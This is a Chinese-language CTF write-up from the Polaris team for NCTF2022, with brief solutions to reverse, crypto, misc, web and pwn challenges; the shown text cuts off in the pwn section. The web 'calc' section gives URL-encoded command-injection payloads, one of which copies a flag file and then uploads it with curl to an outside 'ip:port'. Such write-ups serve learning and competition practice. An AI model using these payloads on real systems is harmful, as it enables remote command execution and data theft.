---
title: NCTF2022–Polaris战队–WP
url: https://www.secpulse.com/archives/193298.html
source: 安全脉搏
date: 2022-12-10
fetch_date: 2025-10-04T01:04:34.188754
---

# NCTF2022–Polaris战队–WP

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# NCTF2022–Polaris战队–WP

[CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)

[星盟安全团队](https://www.secpulse.com/newpage/author?author_id=26965)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-12-09

13,663

**reverse**

**Cyberpunk**

```
a=open("/ata0a/flag",7)
tmpHeap=malloc(0x100)
read(5,tmpHeap,0x100)
xor(tmpHeap,81)
d tmpHeap
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566046.png)

**Ccccha**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-16705660461.png)

**ez\_rev**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566048.png)

四个字节一组进行运算，最后手推出来两个一模一样的二元一次方程

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-16705660481.png)

z3求解

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566050.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566051.png)

**just run it**

逆推出映射转化关系，写出逆转换函数，将正确的box逆转换，再和box2 异或，再逆转换既可得到正确的key

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566052.png)

得到争取的key W1lc0menctf2o2o!

动调推出下面为SM4

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566053.png)

其中最后sm4解密用的是在线解密

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-16705660531.png)

**Crypto**

**signin**

1. MTP攻击后校正

2.通过异或获得完整信息

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566054.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566055.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566056.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566057.png)

**Coloratura**

随机数回溯恢复SourceImg（不足补零）

异或得到flag

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566058.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566059.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566060.png)

**dp\_promax**

dp\_promax \_revenge里有提示，factordb上可查

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566064.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566069.png)

**misc**

**只因因**

使用提及的blast工具，可以找到基因为"CTFR"，然后md5加密即可。

**Signin**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566071.png)

**炉边聚会**

学习链接

https://ds.163.com/article/5e3b84198ec3321d7c00fe8e

https://zhangshuqiao.org/2018-12/炉石卡组代码解析/

里面有现成的脚本，拼接起来，替换掉strings输出即可

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-16705660711.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566072.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566073.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566075.png)

其实后面就卡住了，但是注意到每个卡组数字是一，然后前两个是780和670

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566077.png)

就是除以10然后正常拼接就行，字数不多可以手撕

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566078.png)

**qrssssssss**

二维码批量识别，https://tl.beer/parseqrcode.html

按时间递增排序，然后对文本进行稍稍处理一下：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-16705660781.png)

括号内的内容是26个，其实基本都能确定了，剩下的可以多次试一试就找到了：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566079.png)

NCTF{737150-eeb-465-e91-110a8fb}

**qrssssssss\_revenge**

这个题目按照时间、文件大小排序都没有很好的效果，但是有HINT：LMQH

所以这个题目是要按照纠错等级进行分布，恰好，QR RESEARCH支持这个功能，还是括号内26个字

母，手撕开始：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566083.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566086.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566087.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566089.png)

然后按照掩码从0开始进行顺序拼接：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566090.png)

**Signout**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-16705660901.png)

**web**

**calc**

这题是半个原题，过滤了# ,但是没过滤' ,通过'''来闭合，进而执行命令

开始尝试了curl外带，但/flag不存在，由于是公网环境，读tmp/log.txt发现里面有根目录，就看到了

flag名字Th1s\_is\_\_F1114g ,但还是读不了flag，因为名字里面有过滤字符

采取的办法，cp来绕过

```
/calc?num=%27%27%271%27%0acp%09/T*%09/1.txt%0a%273%27%27%27
```

然后通过curl外带数据

```
/calc?num=%27%27%271%27%0acurl%09-T%09/1.txt%09ip:port%0a%273%27%27%27
```

参考文章

https://xiaolong22333.top/index.php/archives/140/

**pwn**

**babyLinkedList**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193298-1670566091.png)

![](https:/...